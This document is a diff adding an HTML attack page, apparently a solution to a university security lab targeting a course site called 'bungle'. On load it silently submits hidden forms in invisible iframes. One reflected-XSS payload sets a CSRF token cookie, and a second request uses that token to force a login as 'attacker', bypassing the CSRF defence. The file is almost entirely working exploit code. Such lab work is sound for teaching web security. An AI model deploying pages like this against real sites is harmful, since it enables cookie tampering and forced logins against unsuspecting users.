@@ -1,0 +1,27 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta charset="utf-8"/>
+</head>
+<body>
+<form action="http://bungle-cs461.csl.illinois.edu/search" method="GET" type="hidden" target="frame1">
+    <input type="hidden" name="q" value="<script>document.cookie='csrf_token=303f53d771b9d62aaeaa3b5fd7a1f90d';</script>">
+</form>
+
+<form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" type="hidden" target="frame2">
+    <input type="hidden" name="csrf_token" value="303f53d771b9d62aaeaa3b5fd7a1f90d">
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+</form>
+<iframe name="frame1" style="display: none" ></iframe>
+<iframe name="frame2" style="display: none" ></iframe>
+<script>
+    window.onload=function(){
+        var form1 = document.forms[0];
+        form1.submit();
+        var form2 = document.forms[1];
+        form2.submit();
+    }
+</script>
+</body>
+</html>
